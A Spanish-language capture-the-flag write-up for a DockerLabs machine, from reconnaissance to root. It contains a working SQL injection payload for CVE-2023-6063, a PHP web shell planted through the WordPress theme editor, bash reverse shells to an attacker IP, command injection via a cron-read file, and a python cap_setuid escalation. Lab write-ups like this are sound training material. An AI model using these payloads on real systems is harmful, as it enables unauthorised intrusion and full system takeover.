
#DockerLabs #WriteUps #Hacking

>[!NOTE] Habilidades: 
> Wordpress Fuzzing, CVE-2023-6063 - (Time Based SQL Injection), Broken Access Control, Wordpress Template Remote Code Execution, Command Injection, Python Capability `cap_setuid` Local Privilege Escalation

## Laboratorio

Lanzamos el script para iniciar el laboratorio con `docker`, asegúrense de tener `docker` activo 

![[Pasted image 20241104001623.png]]

En mi caso se está usando `podman` en vez de `docker`, es por eso que la dirección IP de la máquina será diferente 

![[Pasted image 20241029233714.png]]

Se asigna la dirección `10.88.0.2`. Agregaré la dirección IP de esta máquina al archivo `/etc/hosts` por comodidad

~~~ bash
echo '10.88.0.2 norc.local' >> /etc/hosts
~~~

![[Pasted image 20241029233843.png]]

Comprobamos que tenemos comunicación con la máquina con un `ping`

~~~ bash
ping -c 1 norc.local
~~~

![[Pasted image 20241029233237.png]]

# Reconocimiento
---
## Nmap 

Empezaremos haciendo un escaneo de puertos abiertos por TCP

~~~ bash
nmap --open -p- --min-rate 5000 -n -sS -v -Pn norc.local -oG allPorts
~~~

![[Pasted image 20241020155256.png]]

Haremos un segundo escaneo donde lanzaremos un conjunto de scripts de reconocimiento, además de detectar la versión del servicio que se ejecutan en los puertos que encontramos

~~~ bash
nmap -sVC -p 22,80 norc.local -oN services
~~~

![[Pasted image 20241029234555.png]]

Vemos que nos intenta redirigir a `norc.labs`, pero nuestra máquina no conoce esa dirección

![[Pasted image 20241020155953.png]]

Se está aplicando `virtual hosting` en esta máquina, por lo que nosotros por ahora no conocemos `norc.labs`, entonces para que pueda hacer la redirección, agregamos este dominio a nuestro archivo `/etc/hosts`

![[Pasted image 20241020160158.png]]

Vemos que ahora nos redirige, y nos encontramos con el siguiente formulario donde nos pide ingresar una contraseña

Si interceptamos la solicitud con `Burpsuite` podemos ver lo siguiente

![[Pasted image 20241021232106.png]]

¿Acabo de ver Wordpress?, probemos intentar a `wp-admin`

![[Pasted image 20241021232335.png]]

Nos redirige al `login` de `wordpress`, si intentamos ingresar credenciales nos aparece este mensaje

![[Pasted image 20241021233030.png]]

## Whatweb

Con esta herramienta veremos las tecnologías que se están ejecutando en la máquina víctima

~~~ bash
whatweb http://norc.labs/ghost-login
~~~

![[Pasted image 20241021234854.png]]

Se está ejecutando Drupal 8, pero tiene aspecto de `wordpress`, WTF

## Fuzzing

Intentemos descubrir rutas o archivos posibles bajo el dominio `norc.labs`

~~~ bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt -mc 200 -u http://norc.labs/FUZZ 
~~~

![[Pasted image 20241022220105.png]]

Encontramos un `robots.txt`, que es un archivo comúnmente usado para gestionar la navegación en un sitio web, echemos un vistazo

![[Pasted image 20241022220805.png]]

![[Pasted image 20241022220834.png]]

El archivo `sitemap` contiene una lista de todas las páginas de un sitio web, veamos que contiene

![[Pasted image 20241022222100.png]]

Sin embargo, nos redirige al `login`, así que mejor intentemos otra cosa, como intentar buscar `plugins`

## Wordpress Plugins Fuzzing

Existe una recopilación bastante extensa de `plugins` de `wordpress` en este repositorio de `github`, es una buena opción si queremos solamente hacer fuzzing para descubrir `plugins`
- https://raw.githubusercontent.com/RandomRobbieBF/wordpress-plugin-list/refs/heads/main/wp-plugins.lst

En mi caso lo descargaré en la carpeta actual, simplemente con `curl` podemos descargar el archivo y guardarlo, en mi caso lo llamaré `wordpress-plugins.txt`

~~~ bash
curl -sL https://raw.githubusercontent.com/RandomRobbieBF/wordpress-plugin-list/refs/heads/main/wp-plugins.lst -o wordpress-plugins.txt
~~~

![[Pasted image 20241029230845.png]]
### Ffuf

Una vez tengamos nuestro diccionario de `plugins` preparado, usaremos `ffuf` para descubrir `plugins`

~~~ bash
ffuf -w wordpress-plugins.txt -u http://norc.labs/FUZZ -t 200 -mc 200
~~~

- `-w`: Ruta al diccionario a utilizar
- `-u`: URL a aplicar fuzzing
- `-t`: Hilos a utilizar
- `-mc`: Mostrar solo los códigos de estado que especifiquemos, en este caso, `200 (OK)`

![[Pasted image 20241029232759.png]]

Luego de una larga espera, la herramienta ha encontrado los siguientes archivos `readme.txt` que pertenecen a diferentes `plugins`

- `/wp-content/plugins/password-protected/readme.txt`
- `/wp-content/plugins/loginizer/readme.txt`

No encontraba vulnerabilidades conocidas para la versión de estos `plugins`, hasta que encontré un `plugin` más

![[Pasted image 20241030001309.png]]

- `/wp-content/plugins/wp-fastest-cache/readme.txt`

Podemos ver la versión del `plugin` y ver si existe alguna vulnerabilidad conocida para la versión de estos `plugins`, podemos extraer la versión con el siguiente comando que busca dentro de los archivos encontrados

~~~ bash
curl -sL http://norc.labs/wp-content/plugins/wp-fastest-cache/readme.txt | grep "Stable" | awk -F ':' '{print $2}' | xargs echo 'version: '
~~~

![[Pasted image 20241030002631.png]]
Busqué en internet por exploits hasta que me encontré que `wp-fastest-cache`, posee un CVE para la versión que se está ejecutando en esta máquina

- https://wpscan.com/blog/unauthenticated-sql-injection-vulnerability-addressed-in-wp-fastest-cache-1-2-2/


# Explotación 
---

## CVE-2023-6063 - Unauthenticated Time Based SQL Injection

Esta vulnerabilidad es de tipo `Time Based`, por lo que podremos saber si nuestras consultas se ejecutan mediante una espera por parte de la respuesta del servidor

**En este caso, tendríamos una cookie que es vulnerable, `wordpress_logged_in`**

- Prueba de concepto: https://github.com/motikan2010/CVE-2023-6063-PoC

Vemos que incluso está presente en `norc.labs`

![[Pasted image 20241030131924.png]]
## SQLmap

Haremos una explotación mediante la herramienta `sqlmap`, que hará que el ataque sea más fácil, pero intentaremos entender cómo funcionan las consultas que envía

### wp_users

Asumiremos que existe una base de datos `wordpress`, entonces debemos ajustar `sqlmap` para que haga consultas a esta base de datos

~~~ bash
sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 -D wordpress -T wp_users --dump --batch
-v2
~~~

- `--dmbs`: Definir el motor de base de datos, en este caso `mysql`
- `-u`: URL
- `--cookie='wordpress_logged_in=*'`: Asignar una cookie a la consulta, **esta cookie es vulnerable a SQL Injection**
- `*`: Valor donde se ingresa el `payload`, en este caso, en la cookie `wordpress_logged_in`
- `--level`: Indica el nivel de intensidad en las pruebas
- `-D`: Especificar el nombre de la base de datos
- `-T`: Nombre de una tabla
- `--dump`: Listar los registros
- `--batch`: Omitir las preguntas al usuario
- `-v2`: Ver información por consola

![[Pasted image 20241030132119.png]]

Este sería el `payload` que está enviando `sqlmap` para intentar 

~~~ sql
AND (SELECT 9419 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x77705f7573657273 AND table_schema=0x776f72647072657373 LIMIT 0,1),2,1))>64,0,5)))))CLKl) AND "wCCa"="wCCa
~~~

![[Pasted image 20241030021501.png]]

`sqlmap` nos dumpeó este registro de la tabla `wp_users`

![[Pasted image 20241030023157.png]]

- Tenemos por un lado el `hash`, que intentaremos crackearlo más adelante
- Vemos el nombre de usuario (`admin`)
- Se nos muestra un dominio para el usuario `admin`, `oledockers.norc.labs`

Agregaremos este nuevo dominio a nuestro archivo `/etc/hosts`

![[Pasted image 20241030131156.png]]

## Explotación Manual

Podemos explotar manualmente esta vulnerabilidad con el siguiente comando, en este caso, se está comprobando si la longitud del nombre de usuario `admin` (asumiendo que existe) es `5`, entonces el servidor esperará 5 segundos para enviarnos la respuesta

~~~ bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: norc.labs' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Content-Length: 21' -H $'Connection: close' \
    -b $'wordpress_logged_in=\" AND (SELECT 100 FROM (SELECT(SLEEP(5)) WHERE (SELECT LENGTH(user_login) FROM wp_users WHERE user_login=\'admin\')=5)TempTable) AND \"a\"=\"a' \
    $'http://norc.labs/wp-login.php'
~~~

En `burpsuite` podemos hacer esto de forma más legible

![[PoC CVE-2023-6063 ‐ Hecho con Clipchamp.mp4]]

`Hashes.com `nos da una pista sobre el algoritmo utilizado para encriptar esta contraseña

![[Pasted image 20241030023917.png]]

## John
Guardamos el hash en un archivo
~~~ bash
echo '$P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6.' >> hash
~~~

Intentamos crackear el `hash` que hemos obtenido con `john`, pero no tendremos éxito

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
~~~

![[Pasted image 20241030132503.png]]

Volvamos a ver los datos que recolectamos, si exploramos el nuevo dominio en el navegador, nos redirige a lo siguiente

![[Pasted image 20241030131326.png]]

Bueno... Podemos usar esta nueva contraseña para intentar entrar directamente en `wp-admin`

~~~ txt
admin:wWZvgxRz3jMBQ ZN
~~~

![[Pasted image 20241030131547.png]]

![[Pasted image 20241030131600.png]]

¡Estamos dentro de `wordpress`!, el siguiente paso sería buscar una forma de ganar acceso al sistema operativo

## Remote Code Execution

Podemos abusar del editor de temas de `wordpress` para editar archivos php de algún tema para ejecutar un comando, en mi caso, seleccionaré el tema Twenty Twenty Three.

~~~ php
system($_GET['cmd']);
~~~

He seleccionado el archivo `hidden-404.php`

![[Pasted image 20241031001142.png]]

Entonces ahora debemos hacer una solicitud a este archivo especificando el parámetro `cmd` en la URL

~~~ bash
http://norc.labs/wp-content/themes/twentytwentythree/patterns/hidden-404.php?cmd=whoami
~~~

![[Pasted image 20241031004055.png]]

## Reverse Shell

Enviaríamos este comando a través del parámetro `cmd`, en este caso, podemos enviar directamente el siguiente comando con algunos caracteres codificados

~~~ bash
bash -c "bash -i >&/dev/tcp/10.88.0.1/443 0>&1"
~~~

Antes de enviar la solicitud no olvidemos lanzar un `listener` con `nc`

~~~ bash
nc -lvnp 443
~~~

![[Pasted image 20241031002132.png]]

Finalmente ejecutamos...

~~~ bash
http://norc.labs/wp-content/themes/twentytwentythree/patterns/hidden-404.php?cmd=bash -c "bash -i >%26%2Fdev%2Ftcp%2F10.88.0.1%2F443 0>%261"
~~~

![[Pasted image 20241031002450.png]]

![[Pasted image 20241031002907.png]]

# Escalada de privilegios
---
## Tratamiento de la TTY

Haremos un procedimiento para poder tener una consola más interactiva (`Ctrl + C`, `Ctrl + L`), en la máquina víctima ejecutamos los siguientes comandos

~~~ bash
script /dev/null -c bash
export TERM=xterm
~~~

En este punto presionamos  CTRL + Z, volveremos a nuestra máquina, solamente hemos dejado el proceso en segundo plano

~~~ bash
stty raw -echo; fg
~~~

Una vez volvimos a la `reverse shell`, volvemos a iniciar la terminal

~~~ bash
reset xterm
~~~

Por último debemos ajustar el tamaño de la terminal, vemos nuestras proporciones en **nuestra máquina**

~~~ bash
stty size
~~~

~~~ bash
22 85
~~~

Ahora usamos la salida de este comando para ajustar las proporciones en la `reverse shell`, las dimensiones podrán variar de acuerdo con el tamaño de tu ventana en la terminal

~~~ bash
stty rows 22 columns 85
~~~

## Búsqueda del vector de escalada

Primero comprobamos los privilegios sudo, pero vemos que no existe en la máquina

![[Pasted image 20241031005002.png]]

Buscaremos privilegios SUID

Buscaremos binarios que tengan el bit SUID asignado para poder ejecutarlos con privilegios 

~~~ bash
find / -perm /4000 2>/dev/null
~~~

![[Pasted image 20241103220448.png]]

Vemos `exim4` al final de la salida, pero su versión no es vulnerable a CVE-2019-10149, por lo que debemos seguir buscando una forma para elevar nuestros privilegios

## Capabilities

Listaremos las capabilities en la máquina

~~~ bash
getcap -r / 2>/dev/null
~~~

![[Pasted image 20241103221839.png]]

Con `setuid` configurado en teoría podríamos elevar nuestro privilegio al cambiar el UID de la `bash`

![[Pasted image 20241103231646.png]]

Usaremos este comando para intentar escalar privilegios aprovechando la capacidad que tenemos de cambiar el UID del proceso de `python`

~~~ python
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
~~~

![[Pasted image 20241104000009.png]]

Pero vemos que no podemos ejecutar esta operación por un conflicto de privilegios, quizá estamos omitiendo algún paso o no estamos revisando lo suficiente. Veamos los usuarios existentes en esta máquina

~~~ bash
cat /etc/passwd
~~~

![[Pasted image 20241103230134.png]]

Vemos un usuario `kvzlx`, veamos si podemos ver lo que hay en su directorio en `/home`

![[Pasted image 20241103223538.png]]

Efectivamente podemos ver el contenido de esta carpeta, vemos un script de `bash`, este script hace lo siguiente

- Recibe una contraseña del archivo `.wp-encrypted.txt`
- Decodifica la contraseña que está en `base64`
- Almacena la contraseña en `/tmp/decoded.txt`
- Ejecuta la contraseña como un comando

## Command Injection

Como está ejecutando lo que recibe del archivo `.wp-encrypted.txt` sin sanitizar el contenido, podemos inyectar un comando a nivel de sistema en este archivo, enviemos una `shell` como el usuario que ejecuta este script a nuestra máquina atacante por el puerto `4444` 

~~~ bash
echo "bash -c 'bash -i >& /dev/tcp/172.17.0.1/1235 0>&1'"| base64
~~~

![[Pasted image 20241103233558.png]]

En unos segundos recibimos una  `shell` como el usuario `kvzlx` en `nc`

![[Pasted image 20241103234633.png]]

Nuevamente haremos un tratamiento para usar esta consola de forma más cómoda y con nuestras proporciones

![[Pasted image 20241103234757.png]]

Si hacemos una vista de los procesos que este usuario ejecuta, podemos ver que se está ejecutando el archivo `.cron_script.sh` que vimos anteriormente

~~~ bash
ps -aux
~~~

![[Pasted image 20241103235221.png]]

Siempre que tengamos acceso a un nuevo usuario debemos volver a buscar formas de escalar privilegios. como `sudo`, `suid`, `capabilities`, etc. En este caso obtuve el mismo resultado al listar las capabilities del binario `/opt/python`

~~~ bash
/sbin/getcap -r / 2>/dev/null
~~~

![[Pasted image 20241104001110.png]]

## Root Time

Intentaremos usar la `capability` que tenemos asignada en `/opt/python` para escalar nuestro privilegio de igual forma que lo intentamos con el usuario `www-data`

~~~ python
/opt/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
~~~

![[Pasted image 20241103235740.png]]